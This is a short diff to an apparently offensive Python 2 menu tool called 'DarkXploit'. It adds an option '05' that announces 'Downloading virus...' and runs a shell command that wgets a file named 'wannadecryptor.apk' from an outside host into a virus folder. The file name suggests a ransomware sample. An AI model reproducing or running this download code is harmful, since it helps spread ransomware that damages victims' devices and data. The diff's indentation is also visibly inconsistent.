@@ -104,7 +104,20 @@ def main():
 			time.sleep(1)
 			print ""+B+"[*]"+N+"Finished"
 			print
-			main()  
+			main()
+ elif dr == "05":
+		dea = raw_input(""+N+"DrXp > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir Wannadecryptor2;cd Wannadecryptor2;wget http://loolzec.blogwaper.com/files/wannadecryptor.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/DarkXploit/virus/Wannadecryptor2/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Job finished"
+			print
+			main()
   elif dr == "virusx update":
     print ""+G+"~ "+B+"UPDATING..."
     time.sleep(2)
